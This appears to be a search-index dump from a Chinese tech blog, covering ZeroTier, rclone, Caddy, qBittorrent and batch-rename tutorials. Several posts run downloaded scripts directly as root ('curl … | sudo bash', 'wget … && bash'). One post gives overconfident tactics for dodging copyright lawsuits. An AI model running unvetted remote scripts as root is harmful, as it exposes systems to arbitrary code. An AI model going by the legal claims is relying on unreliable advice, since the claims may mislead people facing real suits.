.编译即可，不会出现依赖问题。\n","date":"2021年4月29日","externalUrl":null,"permalink":"/posts/lightuploader-use/","section":"","summary":"\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e更新\n【2021.04.29】\n目前支持世纪互联、Google Drive，预计后期会添加对Mega，Telegram等平台的支持\n\n【2021.04.02】\n目前同时支持国际版、个人版(家庭版)。\n\n【2021.04.01】\n修复授权失败、上传文件大小为0等问题。\n现已支持arm、x86、x64平台的系统。\n\n【2021.03.27】\n新增多线程上传、MacOS客户端。\n修复了一个致命bug，建议之前装过的更新下程序。\n\n功能\n\n支持上传文件和文件夹到指定目录，并保持上传前的目录结构。\n支持命令参数使用，方便外部程序调用。\n支持自定义上传分块大小。\n支持多线程上传(多文件同时上传)。\n支持根据文件大小动态调整重试次数，对抗不好的网络环境。\n可以使用Telegram Bot实时监控上传进度\nGithub地址：https://github.com/gaowanliang/LightUploader\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e萌咖大佬写了一个 \u003ca href=\"https://github.com/MoeClub/OneList/tree/master/OneDriveUploader\" target=\"_blank\"\u003e非常好的版本\u003c/a\u003e ，可惜并没有开源，而且已经好久都没有更新了。这个项目作为从 \u003ca href=\"https://github.com/gaowanliang/DownloadBot\" target=\"_blank\"\u003eDownloadBot\u003c/a\u003e 中独立出来的一个简易上传工具，旨在用更轻量化的方式让在各种平台都能快速的向各个网络硬盘上传数据。\u003c/p\u003e","title":"LightUploader，一个轻量化的网盘上传工具，支持OneDrive国际/个人/家庭版、世纪互联、Google Drive","type":"posts"},{"content":"","date":"2021年4月29日","externalUrl":null,"permalink":"/tags/%E4%B8%8A%E4%BC%A0/","section":"Tags","summary":"","title":"上传","type":"tags"},{"content":"","date":"2021年4月29日","externalUrl":null,"permalink":"/tags/%E7%BD%91%E7%9B%98/","section":"Tags","summary":"","title":"网盘","type":"tags"},{"content":"","date":"2021年4月29日","externalUrl":null,"permalink":"/categories/%E8%BD%AF%E4%BB%B6/","section":"Categories","summary":"","title":"软件","type":"categories"},{"content":"","date":"2021年4月28日","externalUrl":null,"permalink":"/tags/%E6%B3%95%E5%BE%8B/","section":"Tags","summary":"","title":"法律","type":"tags"},{"content":" 只收到律师函，一律不回复，不沟通，装死。 只收到起诉书，没见到开庭通知，一律不回复，不沟通。 收到开庭通知就积极应诉，有一半概率对方会庭前主动撤诉。 对方没有撤诉，就准时去开庭，有一定的概率对方没有出庭，这种属于原告自动撤诉。 万一判个几百元，要么别理，要么继续上诉，事情会不了了之。 如果判决金额过大，哈哈，这是不可能的。 法庭上的说辞给大家整理好了。\n原告的证据中自称为图片/文章的著作权利人，其作为法人不是图片的拍摄者，其未提供与原创者之间的许可转让协议等证据，其虽提交了作品登记证书，但该证据只能起到初步证明的作用。\n被告无侵权的主观故意，被告在使用涉案作品时，涉案作品未标注版权信息，相关途径并未注明不得转载。\n被告文章为科普教育，并非用于商业用途，合理使用不构成侵权。\n涉案文章已及时删除，未造成严重后果；\n原告主张的经济损失及合理支出无事实和法律依据，没有证据证明其经济损失及侵权获利。\n原告不能证明其是著作权人及虚构高额的维权费用和经济损失，存在明显的恶意诉讼行为。通过公开信息可以了解，原告在全国范围内针对涉嫌侵权的小微公司或自然人提起著作权侵权诉讼，原告的诉讼请求金额居高，原告的此种维权行为值得引起法院的注意。原告涉嫌恶意诉讼，并且浪费国家大量的司法资源，国家法律对滥用诉讼保护著作权的霸主行为应当谨慎对待。\n原告自身在版权保护上未尽到审慎合理注意义务，其并未采取任何版权保护措施，涉案图片/文章可以在网站上被任何人随意下载，使涉案作品处于随时有被侵权的可能，原告在全国范围内提起侵犯著作权的诉讼，企图通过法律途径获得“天价赔偿”，因此原告自己对版权的保护存在严重的过错，原告具有不正当的目的。\n","date":"2021年4月28日","externalUrl":null,"permalink":"/posts/encounter-malicious-blackmail/","section":"","summary":"一些法律小技巧","title":"遇到恶意敲诈，该怎么办？","type":"posts"},{"content":"","date":"2021年4月25日","externalUrl":null,"permalink":"/tags/zerotier/","section":"Tags","summary":"","title":"Zerotier","type":"tags"},{"content":" 安装配置 ZeroTier 客户端 # 执行命令： curl -s https://install.zerotier.com/ | sudo bash\n运行完后即安装成功，界面会出现如图 启动安装好的 ZeroTier # sudo systemctl start zerotier-one.service sudo systemctl enable zerotier-one.service 将安装好 ZeroTier 的加入你事先注册好的 ZeroTier 虚拟局域网中\n执行命令：sudo zerotier-cli join aaaaaaaaaaaa\n此处的aaaaaaaaaaaa是本人 ZeroTier 虚拟局域网的 ID，请更改为你本人自己的 ID\n然后去 zerotier 管理页面，对加入的设备进行打钩\n搭建 ZeroTier 的 Moon 中转服务器，生成 moon 配置文件 # 执行命令：cd /var/lib/zerotier-one/\n执行命令：sudo zerotier-idtool initmoon identity.public \u0026gt; moon.json\n修改配置文件 moon.json，（主要是添加公网 IP，公网 IP 是服务器的 IP，9993 是 zerotier 的默认端口，你服务器防火墙上需要开放 UDP:9993,否则是连接不上 Moon 的）\n执行命令：nano moon.json\n修改 stableEndpoints，\n{ //... \u0026#34;stableEndpoints\u0026#34;: [\u0026#34;1.1.1.1/9993\u0026#34;] //... } 此处的1.1.1.1就是公网 IP，这你自己服务器的 IP 地址\n按Ctrl+X退出编辑\n生成签名文件 # 执行命令：zerotier-idtool genmoon moon.json\n执行之后会生产一个000000xxxxxxxx.moon的文件，将这个文件下载本地，xxxxxxxx是随机生成的，记住这个后面要用\n将 moon 节点加入网络。创建moons.d文件夹，并把签名文件移动到文件夹内\n执行命令：sudo mkdir moons.d\n执行命令：sudo mv 000000xxxxxxxx.moon moons.d/\n此处的00000xxxxxxxxx.moon是上一步生成的文件名，请改成你自己本人的。\n重启中转服务器的 zerotier-one ：\n执行命令：sudo systemctl restart zerotier-one\n到这里，服务器的 moon 就配置完成了。 对客户端安装 zerotier 后，将配置好的 moon 文件配置到客户端，并重启 zerotier 完成与 moon 的连接。\n客户端配置 # Linux # 使用之前步骤中 moon.json 文件中的 id 值 (10 位的字符串，就是 xxxxxx），不知道的话在服务器上执行如下命令可以得到 id。\n执行命令：grep id /var/lib/zerotier-one/moon.json | head -n 1\n然后在客户端机器里执行命令：\n执行命令：zerotier-cli orbit xxxxxxx xxxxxxx\n此处的xxxxxxx刚刚在服务器得到的 ID 值\nWindows # 打开服务程序services.msc, 找到服务ZeroTier One, 并且在属性内找到该服务可执行文件路径,并且在其下建立 moons.d 文件夹,然后将 moon 服务器下生成的000xxxx.moon文件，拷贝到此文件夹内。再重启该服务即可(计算机右键管理-找到服务双击打开-找到zerotier one右键重新启动即可)\n路径一般是 Windows: C:\\ProgramData\\ZeroTier\\One\nAndroid # Android 的官方客户端是不能使用 moon 的，但是可以用魔改版做到 地址 https://github.com/kaaass/ZerotierFix\n去 releases 下载最新版本后，点击右上角三个点，点击入轨，之后点击右下角加号，然后选择从文件导入，将事先准备好的 moon 文件导入，即可使用 moon 链接各个设备了。\n测试是否成功 # （客户端 cmd 运行）若有出现你的服务器 IP 地址,即可证明 moon 连接成功\n执行命令：zerotier-cli listpeers\n","date":"2021年4月25日","externalUrl":null,"permalink":"/posts/zerotier-moon/","section":"","summary":"\u003ch2 class=\"relative group\"\u003e安装配置 ZeroTier 客户端 \n    \u003cdiv id=\"%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-zerotier-%E5%AE%A2%E6%88%B7%E7%AB%AF\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE-zerotier-%E5%AE%A2%E6%88%B7%E7%AB%AF\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e执行命令： \u003ccode\u003ecurl -s https://install.zerotier.com/ | sudo bash\u003c/code\u003e\u003c/p\u003e","title":"ZeroTier-One在Linux搭建moon完整过程","type":"posts"},{"content":"","date":"2021年4月25日","externalUrl":null,"permalink":"/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","section":"Tags","summary":"","title":"内网穿透","type":"tags"},{"content":"","date":"2021年3月3日","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"为了方便信息处理，有的时候需要在 ssh 终端等纯命令行的情况下输出一个二维码的图片，虽然 Linux 可以使用qrencode模块，但是这个东西始终不适合软件集成，所以我通过多方查找和修改，做出了下面的代码，非常简单，可以直接集成到 python 中使用。\ndef textQR(text): qr = qrcode.QRCode( version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=1, border=1 ) qr.add_data(text) qr.make(fit=True) img = qr.make_image() img2 = np.array(img.convert(\u0026#39;L\u0026#39;)) d = {255: \u0026#39;@@\u0026#39;, 0: \u0026#39; \u0026#39;} rows, cols = img2.shape for i in range(rows): for j in range(cols): print(d[img2[i, j]], end=\u0026#39;\u0026#39;) print(\u0026#39;\u0026#39;) return \u0026#39;\u0026#39; 下面可以看到展示效果\n缺点：如果输入的内容过长，会导致生成的二维码过大，导致一个屏幕难以盛放。所以我只写了通过文本生成二维码的方法，如果有需要可以自行研究如何将图片转换成二维码，也是比较简单的。\n","date":"2021年3月3日","externalUrl":null,"permalink":"/posts/terminal-qrcode/","section":"","summary":"\u003cp\u003e为了方便信息处理，有的时候需要在 ssh 终端等纯命令行的情况下输出一个二维码的图片，虽然 Linux 可以使用\u003ccode\u003eqrencode\u003c/code\u003e模块，但是这个东西始终不适合软件集成，所以我通过多方查找和修改，做出了下面的代码，非常简单，可以直接集成到 python 中使用。\u003c/p\u003e","title":"Python 命令行输出二维码","type":"posts"},{"content":"","date":"2021年3月3日","externalUrl":null,"permalink":"/tags/%E4%BA%8C%E7%BB%B4%E7%A0%81/","section":"Tags","summary":"","title":"二维码","type":"tags"},{"content":"","date":"2021年3月3日","externalUrl":null,"permalink":"/categories/%E5%B7%A5%E5%85%B7/","section":"Categories","summary":"","title":"工具","type":"categories"},{"content":"主要命令\necho \u0026#34;XXX.XX { root * /home/xxx file_server browse }\u0026#34; \u0026gt;\u0026gt; /usr/local/caddy/Caddyfile wget -r -np -nH -R index.html -L -N --no-use-server-timestamps https://XXX.XX 可以搭配 cloudflare 加速转移\n","date":"2021年2月23日","externalUrl":null,"permalink":"/posts/file-trans-wget/","section":"","summary":"\u003cp\u003e主要命令\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;XXX.XX {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    root * /home/xxx\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    file_server browse\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e}\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /usr/local/caddy/Caddyfile\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget -r -np -nH -R index.html -L -N --no-use-server-timestamps https://XXX.XX\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以搭配 cloudflare 加速转移\u003c/p\u003e","title":"使用wget和caddy等简单快速的转移服务器之间的文件","type":"posts"},{"content":"","date":"2021年2月23日","externalUrl":null,"permalink":"/categories/%E5%91%BD%E4%BB%A4/","section":"Categories","summary":"","title":"命令","type":"categories"},{"content":"","date":"2021年2月23日","externalUrl":null,"permalink":"/tags/%E6%96%87%E4%BB%B6/","section":"Tags","summary":"","title":"文件","type":"tags"},{"content":"","date":"2021年2月23日","externalUrl":null,"permalink":"/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/","section":"Tags","summary":"","title":"服务器","type":"tags"},{"content":"","date":"2021年2月16日","externalUrl":null,"permalink":"/tags/caddy/","section":"Tags","summary":"","title":"Caddy","type":"tags"},{"content":" 常用命令行语句 # 目前仅一条：\ncaddy file-server # caddy file-server [--root \u0026lt;path\u0026gt;] [--listen \u0026lt;addr\u0026gt;] [--domain \u0026lt;example.com\u0026gt;] [--browse] [--templates] [--access-log] 启动一个简单但可用于生产的静态文件服务器。\n--root 指定根文件路径。默认为当前工作目录。\n--listen 接受侦听器地址。默认值为：80，除非使用--domain，否则默认值为：443。\n--domain 将只通过该主机名提供文件服务，而 Caddy 将尝试通过 HTTPS 提供文件服务，所以如果它是公共域名，请确保首先正确配置了任何公共 DNS。默认端口将更改为 443。\n--browse 如果请求的目录没有索引文件，--browse将启用目录列表。\n--templates 将启用模板呈现。\n--access-log 启用请求/访问日志。\n此命令禁用管理 API，使在本地开发计算机上运行多个实例更容易。\nCaddyfile # Caddyfile 是一种方便人类使用的 Caddy 配置格式。它是大多数人最喜欢的使用 Caddy 的方式，因为它易于编写、易于理解，并且对于大多数用例来说足够表达。\n看起来是这样的：\nexample.com root * /var/www/wordpress php_fastcgi unix//run/php/php-version-fpm.sock file_server ","date":"2021年2月16日","externalUrl":null,"permalink":"/posts/caddyv2-config/","section":"","summary":"整理了一些常用的语句和配置，供大家参考","title":"Caddy V2常用命令行语句和Caddyfile配置","type":"posts"},{"content":"","date":"2021年2月16日","externalUrl":null,"permalink":"/tags/%E7%A8%8B%E5%BA%8F/","section":"Tags","summary":"","title":"程序","type":"tags"},{"content":"","date":"2021年2月15日","externalUrl":null,"permalink":"/tags/bt/","section":"Tags","summary":"","title":"BT","type":"tags"},{"content":"有不少人用 aria2 下载 BT，但是相对来说 QBittorrent 还是更好用一点，但是网上没什么一键脚本，还得靠自己动手安装，默认的 apt 源里的 qb 很旧了，还是用新的比较好\n安装的版本是 nox 版本，不需要安装任何图形化界面，直接打开网页就可以用。\n创建默认配置目录\nmkdir -p ~/.config/qBittorrent 创建配置文件\ntouch ~/.config/qBittorrent/qBittorrent.conf 编辑文件\nnano ~/.config/qBittorrent/qBittorrent.conf 添加下面的内容，Web UI 端口可以自行定义\n[LegalNotice] Accepted=true [Preferences] WebUI\\Port=8080 General\\Locale=zh 输入完后，按下Ctrl+X，然后输入 y 保存\n之后直接下载别人编译好的二进制文件 https://github.com/userdocs/qbittorrent-nox-static/releases/ 我现在命令里写的是现在的最新版本文件，如果有新版本了，请自行替换 https://github.com/userdocs/qbittorrent-nox-static/releases/download/release-4.3.3_v1.2.12/amd64-glibc-qbittorrent-nox 部分即可，使用 glibc 版本即可\nmkdir -p ~/bin \u0026amp;\u0026amp; source ~/.profile wget -qO ~/bin/qbittorrent-nox https://github.com/userdocs/qbittorrent-nox-static/releases/download/release-4.3.3_v1.2.12/amd64-glibc-qbittorrent-nox chmod 700 ~/bin/qbittorrent-nox 输入\n~/bin/qbittorrent-nox 启动程序，根据程序提示进入你的 vps IP:8080 即可\n","date":"2021年2月15日","externalUrl":null,"permalink":"/posts/qbittorrent-install/","section":"","summary":"使用 qbittorrent-nox-static 二进制文件安装","title":"Debian/Ubuntu VPS 安装最新版 qbittorrent","type":"posts"},{"content":"","date":"2021年2月15日","externalUrl":null,"permalink":"/tags/qbittorrent/","section":"Tags","summary":"","title":"Qbittorrent","type":"tags"},{"content":"","date":"2021年2月15日","externalUrl":null,"permalink":"/tags/vps/","section":"Tags","summary":"","title":"VPS","type":"tags"},{"content":"","date":"2020年12月2日","externalUrl":null,"permalink":"/tags/debian/","section":"Tags","summary":"","title":"Debian","type":"tags"},{"content":"","date":"2020年12月2日","externalUrl":null,"permalink":"/tags/google-drive/","section":"Tags","summary":"","title":"Google Drive","type":"tags"},{"content":"","date":"2020年12月2日","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"2020年12月2日","externalUrl":null,"permalink":"/tags/rclone/","section":"Tags","summary":"","title":"Rclone","type":"tags"},{"content":" 安装 # 安装 rclone # wget https://gwliang.com/rclone_debian.sh \u0026amp;\u0026amp; bash rclone_debian.sh 获取 API # 首先获取谷歌 API 凭据，先启用 Google Drive API，启用地址：【点击进入】。 再创建一个OAuth client ID，创建地址：【点击进入】。应用类型选择桌面程序，名称自己填，这里博主我就保持默认。\n之后将出现的客户端 ID和客户端密钥 准备好，接下来会用到。\n初始化配置 # rclone config 会出现以下信息：\nNo remotes found - make a new one n) New remote s) Set configuration password q) Quit config n/s/q\u0026gt; n name\u0026gt; gwl # 配置名称，随便填 Type of storage to configure. Enter a string value. Press Enter for the default (\u0026#34;\u0026#34;). Choose a number from below, or type in your own value 1 / 1Fichier \\ \u0026#34;fichier\u0026#34; 2 / Alias for an existing remote \\ \u0026#34;alias\u0026#34; 3 / Amazon Drive \\ \u0026#34;amazon cloud drive\u0026#34; 4 / Amazon S3 Compliant Storage Provider (AWS, Alibaba, Ceph, Digital Ocean, Dreamhost, IBM COS, Minio, Tencent COS, etc) \\ \u0026#34;s3\u0026#34; 5 / Backblaze B2 \\ \u0026#34;b2\u0026#34; 6 / Box \\ \u0026#34;box\u0026#34; 7 / Cache a remote \\ \u0026#34;cache\u0026#34; 8 / Citrix Sharefile \\ \u0026#34;sharefile\u0026#34; 9 / Dropbox \\ \u0026#34;dropbox\u0026#34; 10 / Encrypt/Decrypt a remote \\ \u0026#34;crypt\u0026#34; 11 / FTP Connection \\ \u0026#34;ftp\u0026#34; 12 / Google Cloud Storage (this is not Google Drive) \\ \u0026#34;google cloud storage\u0026#34; 13 / Google Drive \\ \u0026#34;drive\u0026#34; 14 / Google Photos \\ \u0026#34;google photos\u0026#34; 15 / Hubic \\ \u0026#34;hubic\u0026#34; 16 / In memory object storage system. \\ \u0026#34;memory\u0026#34; 17 / Jottacloud \\ \u0026#34;jottacloud\u0026#34; 18 / Koofr \\ \u0026#34;koofr\u0026#34; 19 / Local Disk \\ \u0026#34;local\u0026#34; 20 / Mail.ru Cloud \\ \u0026#34;mailru\u0026#34; 21 / Mega \\ \u0026#34;mega\u0026#34; 22 / Microsoft Azure Blob Storage \\ \u0026#34;azureblob\u0026#34; 23 / Microsoft OneDrive \\ \u0026#34;onedrive\u0026#34; 24 / OpenDrive \\ \u0026#34;opendrive\u0026#34; 25 / OpenStack Swift (Rackspace Cloud Files, Memset Memstore, OVH) \\ \u0026#34;swift\u0026#34; 26 / Pcloud \\ \u0026#34;pcloud\u0026#34; 27 / Put.io \\ \u0026#34;putio\u0026#34; 28 / QingCloud Object Storage \\ \u0026#34;qingstor\u0026#34; 29 / SSH/SFTP Connection \\ \u0026#34;sftp\u0026#34; 30 / Sugarsync \\ \u0026#34;sugarsync\u0026#34; 31 / Tardigrade Decentralized Cloud Storage \\ \u0026#34;tardigrade\u0026#34; 32 / Transparently chunk/split large files \\ \u0026#34;chunker\u0026#34; 33 / Union merges the contents of several upstream fs \\ \u0026#34;union\u0026#34; 34 / Webdav \\ \u0026#34;webdav\u0026#34; 35 / Yandex Disk \\ \u0026#34;yandex\u0026#34; 36 / http Connection \\ \u0026#34;http\u0026#34; 37 / premiumize.me \\ \u0026#34;premiumizeme\u0026#34; 38 / seafile \\ \u0026#34;seafile\u0026#34; Storage\u0026gt; 13 #选择13，Google Drive，注意该序列号会随时变化，看清楚再填 ** See help for drive backend at: https://rclone.org/drive/ ** Google Application Client Id Setting your own is recommended. See https://rclone.org/drive/#making-your-own-client-id for how to create your own. If you leave this blank, it will use an internal key which is low performance. Enter a string value. Press Enter for the default (\u0026#34;\u0026#34;). client_id\u0026gt; xxxxxx.apps.googleusercontent.com # 这里输入客户端 ID OAuth Client Secret Leave blank normally. Enter a string value. Press Enter for the default (\u0026#34;\u0026#34;). client_secret\u0026gt; xxxxxxxx # 这里输入客户端密钥 Scope that rclone should use when requesting access from drive. Enter a string value. Press Enter for the default (\u0026#34;\u0026#34;). Choose a number from below, or type in your own value 1 / Full access all files, excluding Application Data Folder. \\ \u0026#34;drive\u0026#34; 2 / Read-only access to file metadata and file contents. \\ \u0026#34;drive.readonly\u0026#34; / Access to files created by rclone only. 3 | These are visible in the drive website. | File authorization is revoked when the user deauthorizes the app. \\ \u0026#34;drive.file\u0026#34; / Allows read and write access to the Application Data folder. 4 | This is not visible in the drive website. \\ \u0026#34;drive.appfolder\u0026#34; / Allows read-only access to file metadata but 5 | does not allow any access to read or download file content. \\ \u0026#34;drive.metadata.readonly\u0026#34; scope\u0026gt; 1 # 这里输入1，完全访问所有文件，不包括应用程序数据文件夹。 ID of the root folder Leave blank normally. Fill in to access \u0026#34;Computers\u0026#34; folders (see docs), or for rclone to use a non root folder as its starting point. Enter a string value. Press Enter for the default (\u0026#34;\u0026#34;). root_folder_id\u0026gt; Service Account Credentials JSON file path Leave blank normally. Needed only if you want use SA instead of interactive login. Leading `~` will be expanded in the file name as will environment variables such as `${RCLONE_CONFIG_DIR}`. Enter a string value. Press Enter for the default (\u0026#34;\u0026#34;). service_account_file\u0026gt; Edit advanced config? (y/n) y) Yes n) No (default) y/n\u0026gt; n # 输入n Remote config Use auto config? * Say Y if not sure * Say N if you are working on a remote or headless machine y) Yes (default) n) No y/n\u0026gt; n # 输入n Please go to the following link: https://accounts.google.com/o/oauth2/auth?xxxxxx # 这里进入提示的链接，复制验证码 Log in and authorize rclone for access Enter verification code\u0026gt; 4/1AY0e- # 这里输入验证码 Configure this as a team drive? y) Yes n) No (default) y/n\u0026gt; n # 输入n -------------------- [gwl] type = drive client_id = xxxxx.apps.googleusercontent.com client_secret = xxxxx scope = drive token = {\u0026#34;access_token\u0026#34;:\u0026#34;ya29.a0AfH6SMD66Wxxxx\u0026#34;,\u0026#34;token_type\u0026#34;:\u0026#34;Bearer\u0026#34;,\u0026#34;refresh_token\u0026#34;:\u0026#34;1//09SDe5e04DxQrCgYIARAAGAkSNwF\u0026#34;,\u0026#34;expiry\u0026#34;:\u0026#34;2020-12-02T10:44:56.526147875Z\u0026#34;} -------------------- y) Yes this is OK (default) e) Edit this remote d) Delete this remote y/e/d\u0026gt; y Current remotes: Name Type ==== ==== gwl drive e) Edit existing remote n) New remote d) Delete remote r) Rename remote c) Copy remote s) Set configuration password q) Quit config e/n/d/r/c/s/q\u0026gt; q # 输入q保存退出 挂载为磁盘 # #新建本地文件夹，路径自己定，即下面的 LocalFolder\nmkdir /root/GoogleDrive # 挂载为磁盘，下面的DriveName、Folder、LocalFolder参数根据说明自行替换 rclone mount DriveName:Folder LocalFolder --copy-links --no-gzip-encoding --no-check-certificate --allow-other --allow-non-empty --umask 000 DriveName为初始化配置填的name，Folder为Google Drive里的文件夹，LocalFolder为 VPS 上的本地文件夹。\n比如高玩梁按照刚才的操作挂载指令就是：\nrclone mount gwl:/ /root/GoogleDrive --copy-links --no-gzip-encoding --no-check-certificate --allow-other --allow-non-empty --umask 000 挂载成功后，输入df -h命令查看即可！\n开机自启 # 先新建 systemd 配置文件，适用 CentOS 7、Debian 8+、Ubuntu 16+。\n再使用命令：\n# 将后面修改成你上面手动运行命令中，除了rclone的全部参数 command=\u0026#34;mount DriveName:Folder LocalFolder --copy-links --no-gzip-encoding --no-check-certificate --allow-other --allow-non-empty --umask 000\u0026#34; #以下是一整条命令，一起复制到SSH客户端运行 cat \u0026gt; /etc/systemd/system/rclone.service \u0026lt;\u0026lt;EOF [Unit] Description=Rclone After=network-online.target [Service] Type=simple ExecStart=$(command -v rclone) ${command} Restart=on-abort User=root [Install] WantedBy=default.target EOF 开始启动： # systemctl start rclone 设置开机自启： # systemctl enable rclone 其他命令： # 重启：systemctl restart rclone 停止：systemctl stop rclone 状态：systemctl status rclone 如果你想挂载多个网盘，那么将 systemd 配置文件的rclone.service改成rclone1.service即可，重启动什么的同样换成rclone1。\n","date":"2020年12月2日","externalUrl":null,"permalink":"/posts/rclone-mount-gd/","section":"","summary":"\u003ch1 class=\"relative group\"\u003e安装 \n    \u003cdiv id=\"%E5%AE%89%E8%A3%85\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E5%AE%89%E8%A3%85\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\n\n\u003ch2 class=\"relative group\"\u003e安装 rclone \n    \u003cdiv id=\"%E5%AE%89%E8%A3%85-rclone\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E5%AE%89%E8%A3%85-rclone\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://gwliang.com/rclone_debian.sh \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e bash rclone_debian.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\n\u003ch2 class=\"relative group\"\u003e获取 API \n    \u003cdiv id=\"%E8%8E%B7%E5%8F%96-api\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E8%8E%B7%E5%8F%96-api\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e首先获取谷歌 API 凭据，先启用 Google Drive API，启用地址：\u003ca href=\"https://console.developers.google.com/apis/api/drive.googleapis.com/overview\" target=\"_blank\"\u003e【点击进入】\u003c/a\u003e。\n\u003ca href=\"https://imgchr.com/i/DI17wj\" target=\"_blank\"\u003e\n  \u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"https://s3.ax1x.com/2020/12/02/DI17wj.png\" alt=\"DI17wj.png\" /\u003e\n    \n  \u003c/figure\u003e\n\u003c/a\u003e\n再创建一个\u003ccode\u003eOAuth client ID\u003c/code\u003e，创建地址：\u003ca href=\"https://console.developers.google.com/apis/credentials/oauthclient\" target=\"_blank\"\u003e【点击进入】\u003c/a\u003e。应用类型选择\u003ccode\u003e桌面程序\u003c/code\u003e，名称自己填，这里博主我就保持默认。\u003c/p\u003e","title":"在Debian/Ubuntu上使用rclone挂载Google Drive网盘","type":"posts"},{"content":"","date":"2020年12月2日","externalUrl":null,"permalink":"/tags/%E8%BD%AC%E8%BD%BD/","section":"Tags","summary":"","title":"转载","type":"tags"},{"content":" 批量给文件添加前后缀 # 前缀 # 如果你需要给某个类型的文件加上前缀，请参考下面的代码\nfor /f \u0026#34;delims=\u0026#34; %%f in (\u0026#39;dir /a /b *.mp3\u0026#39;) do ( ren \u0026#34;%%f\u0026#34; \u0026#34;N1-%%~nxf\u0026#34; ) pause 其中.mp3是你需要修改的后缀名，而N1-是你需要添加的前缀\n后缀 # 如果你需要给某个类型的文件加上后缀，请参考下面的代码\nfor /f \u0026#34;delims=\u0026#34; %%f in (\u0026#39;dir /a /b *.mp3\u0026#39;) do ( ren \u0026#34;%%f\u0026#34; \u0026#34;%%~nf-N2%%~xf\u0026#34; ) pause 其中.mp3是你需要修改的后缀名，而-N2是你需要添加的后缀\n批量按顺序重命名 # 如果你需要给文件按顺序重命名，请参考下面的代码\n文件 # 前缀 # set a=0 setlocal EnableDelayedExpansion for /f \u0026#34;delims=\u0026#34; %%f in (\u0026#39;dir /a /b *.*\u0026#39;) do ( if not \u0026#34;%%~nxf\u0026#34;==\u0026#34;%~nx0\u0026#34; ( set /A a+=1 ren \u0026#34;%%f\u0026#34; \u0026#34;动漫!a!%%~xf\u0026#34; ) ) pause 其中动漫是每个文件所拥有的前缀\n后缀 # set a=0 setlocal EnableDelayedExpansion for /f \u0026#34;delims=\u0026#34; %%f in (\u0026#39;dir /a /b *.*\u0026#39;) do ( if not \u0026#34;%%~nxf\u0026#34;==\u0026#34;%~nx0\u0026#34; ( set /A a+=1 ren \u0026#34;%%f\u0026#34; \u0026#34;!a!动漫%%~xf\u0026#34; ) ) pause 其中动漫是每个文件所拥有的后缀\n文件夹 # 前缀 # set a=1000 setlocal EnableDelayedExpansion for /f 